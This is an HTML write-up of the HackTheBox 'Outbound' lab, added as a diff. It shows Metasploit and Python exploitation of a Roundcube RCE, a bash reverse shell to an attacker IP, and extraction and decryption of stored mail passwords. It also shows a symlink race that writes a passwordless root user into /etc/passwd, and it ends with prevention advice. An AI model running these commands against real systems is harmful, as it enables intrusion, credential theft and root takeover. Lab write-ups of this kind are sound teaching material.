@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outbound - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            color: #00d9ff;
+            margin-top: 1.5em;
+            margin-bottom: 0.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Highlight boxes */
+        .highlight {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .highlight strong {
+            color: #ffc107;
+        }
+
+        .success {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #28a745;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .success strong {
+            color: #28a745;
+        }
+
+        .warning {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #dc3545;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .warning strong {
+            color: #dc3545;
+        }
+
+        /* Step boxes */
+        .step {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .step h4 {
+            margin-top: 0;
+            color: #00d9ff;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    
+        /* Screenshot slot wrapper (added for repo build) */
+        .shot { margin: 1.5em 0; }
+        .shot img { margin: 0; }
+</style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Outbound</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Box Name:</strong> Outbound</p>
+        <p><strong>Difficulty:</strong> Medium</p>
+        <p><strong>OS:</strong> Linux (Ubuntu)</p>
+        <p><strong>IP Address:</strong> 10.129.232.158</p>
+    </div>
+
+    <h2>Summary</h2>
+    <p>Outbound is a medium Linux box running Roundcube Webmail 1.6.10. Initial access comes from a post-auth RCE (CVE-2025-49113) using discovered credentials, giving a www-data shell. From there, database credentials in the Roundcube config allow decrypting stored session passwords, enabling lateral movement to jacob. Root is achieved by abusing a world-writable root-owned log file belonging to the Below monitoring tool via a symlink race condition (TOCTOU).</p>
+    <h2>Reconnaissance</h2>
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap -sC -sV -O 10.129.232.158</code></pre>
+    <p><strong>Results:</strong></p>
+    <ul>
+        <li>Port 22: SSH</li>
+        <li>Port 80: HTTP (Roundcube Webmail)</li>
+        <li>Domain: <code>mail.outbound.htb</code></li>
+    </ul>
+    <pre><code>echo "10.129.232.158 mail.outbound.htb outbound.htb" | sudo tee -a /etc/hosts</code></pre>
+    <div class="shot">
+        <img src="outbound_01.png" alt="nmap results showing SSH + Roundcube on port 80"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_01.png</code><br>nmap results showing SSH + Roundcube on port 80</div>
+    </div>
+    <h3>Web Enumeration</h3>
+    <p>Visiting <code>http://mail.outbound.htb</code> reveals Roundcube Webmail 1.6.10 with a login page at root.</p>
+    <div class="shot">
+        <img src="outbound_02.png" alt="Roundcube login page showing version 1.6.10"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_02.png</code><br>Roundcube login page showing version 1.6.10</div>
+    </div>
+    <p>Searching for Roundcube 1.6.10 vulnerabilities turns up <code>CVE-2025-49113</code>: a post-auth RCE via PHP object deserialization.</p>
+    <ul>
+        <li>Exploit: <code>https://github.com/00xCanelo/CVE-2025-49113</code></li>
+        <li>Metasploit module: <code>exploit/multi/http/roundcube_auth_rce_cve_2025_49113</code></li>
+        <li>Requirements: valid user credentials + vulnerable Roundcube version (≤1.5.9 or ≤1.6.10)</li>
+    </ul>
+    <h2>Initial Access - Roundcube RCE</h2>
+    <h3>Credentials Discovery</h3>
+    <p>Initial credentials (method varies — could be default testing, brute force, or other enumeration):</p>
+    <pre><code>Username: tyler
+Password: LhKL1o9Nm3X2</code></pre>
+    <h3>Exploitation with Metasploit</h3>
+    <pre><code>msfconsole -q
+use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
+set RHOSTS 10.129.232.158
+set VHOST mail.outbound.htb
+set USERNAME tyler
+set PASSWORD LhKL1o9Nm3X2
+set LHOST 10.10.14.243
+set LPORT 4444
+set AutoCheck false
+exploit</code></pre>
+    <p>Result: shell as www-data.</p>
+    <div class="shot">
+        <img src="outbound_03.png" alt="Metasploit RCE giving a www-data shell"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_03.png</code><br>Metasploit RCE giving a www-data shell</div>
+    </div>
+    <h4>Alternative: Python Exploit</h4>
+    <pre><code>git clone https://github.com/00xCanelo/CVE-2025-49113.git
+cd CVE-2025-49113
+python3 CVE-2025-49113.py http://mail.outbound.htb tyler 'LhKL1o9Nm3X2' 'id'
+nc -lvnp 4444
+python3 CVE-2025-49113.py http://mail.outbound.htb tyler 'LhKL1o9Nm3X2' \
+    'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.243/4444 0&gt;&amp;1"' </code></pre>
+    <h2>Post-Exploitation &amp; User Flag</h2>
+    <h3>Shell Stabilization</h3>
+    <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm</code></pre>
+    <h3>Finding Database Credentials</h3>
+    <pre><code>find /var/www -name "config.inc.php" 2&gt;/dev/null
+cat /var/www/html/config/config.inc.php</code></pre>
+    <p><strong>Found credentials:</strong></p>
+    <pre><code>$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code></pre>
+    <h3>Database Enumeration</h3>
+    <pre><code>mysql -u roundcube -p'RCDBPass2025' roundcube
+SHOW TABLES;
+SELECT * FROM users;</code></pre>
+    <p>Users found: jacob, mel, tyler (all on localhost). Encrypted passwords live in the session table:</p>
+    <pre><code>mysql -u roundcube -p'RCDBPass2025' roundcube -e "SELECT * FROM session\G"
+Jacob: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
+Tyler: TPD0XlxNwd3yRQfb/T+bVY4JQyxrq1B3</code></pre>
+    <div class="shot">
+        <img src="outbound_04.png" alt="Roundcube session table with encrypted passwords"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_04.png</code><br>Roundcube session table with encrypted passwords</div>
+    </div>
+    <h3>Decrypting Passwords</h3>
+    <p>Using Roundcube's DES key (<code>rcmail-!24ByteDESkey*Str</code>) to decrypt the stored session password:</p>
+    <pre><code>php -r '$k="rcmail-!24ByteDESkey*Str";
+echo openssl_decrypt(base64_decode("L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"),
+  "DES-EDE3-CBC", $k, OPENSSL_RAW_DATA, substr($k,0,8));'
+Jacob's password: 595mO8DmwGeD</code></pre>
+    <h3>Lateral Movement to Jacob</h3>
+    <pre><code>su jacob
+# Password: 595mO8DmwGeD
+cat /var/mail/jacob</code></pre>
+    <p>Jacob's mail contains a policy-change password reset from Tyler (<code>gY4Wr3a1evp4</code>), and a note from Mel that the Below monitoring tool was enabled and that Jacob has privileges to inspect its logs.</p>
+    <div class="highlight">
+    <p><strong>Key takeaways:</strong> Below monitoring tool was recently enabled, Jacob has privileges to inspect logs, and there is a hint to check <code>/var/log/below/</code>.</p>
+    </div>
+    <h3>User Flag</h3>
+    <pre><code>cat /home/jacob/user.txt</code></pre>
+    <h2>Privilege Escalation - Symlink Race Condition</h2>
+    <h3>Sudo Privileges Check</h3>
+    <pre><code>sudo -l
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
+    !/usr/bin/below --debug*, !/usr/bin/below -d*</code></pre>
+    <p>Jacob can run <code>/usr/bin/below</code> as root with restrictions on the <code>--config</code>, <code>--debug</code>, and <code>-d</code> flags.</p>
+    <h3>Discovering the Vulnerability</h3>
+    <p>Based on Mel's email hint, check Below's log directory:</p>
+    <pre><code>ls -la /var/log/below/
+-rw-rw-rw- 1 jacob jacob 236 Jul  8 20:45 error_jacob.log
+-rw-rw-rw- 1 root  root    0 Jul 14 16:39 error_root.log    ← VULNERABLE!
+drwxr-xr-x 2 root  root 4096 Oct 24 07:10 store</code></pre>
+    <div class="warning">
+    <p><strong>Critical finding:</strong> <code>error_root.log</code> is world-writable (0666), owned by <code>root:root</code>. This is a misconfiguration that allows symlink attacks.</p>
+    </div>
+    <div class="shot">
+        <img src="outbound_05.png" alt="ls -la of /var/log/below showing world-writable error_root.log"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_05.png</code><br>ls -la of /var/log/below showing world-writable error_root.log</div>
+    </div>
+    <h3>Understanding the Symlink Attack</h3>
+    <p>A root process (Below running via sudo) writes to <code>error_root.log</code>. The file is world-writable, so we can delete it, and the root process recreates it when writing. If we replace it with a symlink during the recreation window, root writes to our symlink target. Pointing it at <code>/etc/passwd</code> lets us append a UID 0 user with no password.</p>
+    <h3>The Exploit</h3>
+    <h4>Step 1: Create Fake Passwd Entry</h4>
+    <pre><code>echo 'pwn::0:0:pwn:/root:/bin/bash' &gt; /tmp/fakepass</code></pre>
+    <p>The <code>::</code> empty password field means no password is required, and UID/GID 0 makes it a root account.</p>
+    <h4>Step 2: Terminal 1 — Trigger Loop (Critical!)</h4>
+    <p>Open a second SSH session as Jacob and constantly trigger Below to write errors, creating many race opportunities per second:</p>
+    <pre><code>while true; do
+  sudo /usr/bin/below dump system --snapshot /fakefile123 2&gt;/dev/null
+  sudo /usr/bin/below snapshot -b "1 hour ago" 2&gt;/dev/null
+  sleep 0.5
+done</code></pre>
+    <h4>Step 3: Terminal 2 — Race Condition Loop</h4>
+    <pre><code>while true; do
+  rm -f /var/log/below/error_root.log 2&gt;/dev/null
+  ln -s /etc/passwd /var/log/below/error_root.log 2&gt;/dev/null
+  cp /tmp/fakepass /var/log/below/error_root.log 2&gt;/dev/null &amp;&amp; echo "SUCCESS!" &amp;&amp; break
+  sleep 0.05
+done</code></pre>
+    <h4>Step 4: Verify and Escalate</h4>
+    <pre><code>tail /etc/passwd | grep pwn
+# pwn::0:0:pwn:/root:/bin/bash
+su pwn
+id
+# uid=0(root) gid=0(root) groups=0(root)</code></pre>
+    <div class="shot">
+        <img src="outbound_06.png" alt="SUCCESS! from the race loop and id showing uid=0(root)"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_06.png</code><br>SUCCESS! from the race loop and id showing uid=0(root)</div>
+    </div>
+    <h3>Root Flag</h3>
+    <pre><code>cat /root/root.txt</code></pre>
+    <h2>Key Lessons &amp; Indicators</h2>
+    <p>This exploit is a classic TOCTOU (Time-Of-Check-Time-Of-Use) vulnerability: root checks whether <code>error_root.log</code> exists, we swap it for a symlink in the race window, and root then writes to the symlink target. To find these, look for world-writable files in privileged locations:</p>
+    <pre><code>find / -type f -perm -0002 2&gt;/dev/null | grep -vE 'proc|sys'</code></pre>
+    <p>Red flags: world-writable files owned by root, log files with 0666/0777 permissions, predictable temp-file locations, and sudo privileges that run file-writing commands as root. Instead of <code>/etc/passwd</code>, the same primitive could target an SSH <code>authorized_keys</code> file, a <code>sudoers.d</code> drop-in, root's <code>.bashrc</code>, or <code>/etc/shadow</code>.</p>
+    <h3>Prevention</h3>
+    <ul>
+        <li>Never make root-owned files world-writable — log files should be <code>0644 root:root</code>.</li>
+        <li>Audit file permissions regularly in sensitive directories (find, lynis, AIDE/Tripwire).</li>
+        <li>Monitor for rapid symlink/file creation in <code>/var/log</code> with auditd.</li>
+        <li>Encrypt sensitive data properly — DES is weak, prefer AES-256.</li>
+        <li>Follow least privilege for sudo configurations.</li>
+    </ul>
+    <h2>Credentials Summary</h2>
+    <table>
+        <thead><tr><th>User</th><th>Password</th><th>Access Method</th></tr></thead>
+        <tbody>
+            <tr><td>tyler</td><td>LhKL1o9Nm3X2</td><td>Roundcube login</td></tr>
+            <tr><td>roundcube (MySQL)</td><td>RCDBPass2025</td><td>Database access</td></tr>
+            <tr><td>jacob</td><td>595mO8DmwGeD</td><td>SSH / su</td></tr>
+            <tr><td>pwn (created)</td><td>(none)</td><td>Root via race condition</td></tr>
+        </tbody>
+    </table>
+    <h2>Tools Used</h2>
+    <ul>
+        <li>nmap — port scanning and service detection</li>
+        <li>Metasploit — CVE-2025-49113 exploitation</li>
+        <li>MySQL client — database enumeration</li>
+        <li>PHP — password decryption script</li>
+        <li>Bash — race condition exploitation</li>
+        <li>SSH — remote access and lateral movement</li>
+    </ul>
+    <h2>References</h2>
+    <ul>
+        <li>CVE-2025-49113: <code>https://nvd.nist.gov/vuln/detail/CVE-2025-49113</code></li>
+        <li>Exploit: <code>https://github.com/00xCanelo/CVE-2025-49113</code></li>
+        <li>Below: <code>https://github.com/facebookincubator/below</code></li>
+        <li>TOCTOU: <code>https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use</code></li>
+    </ul>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
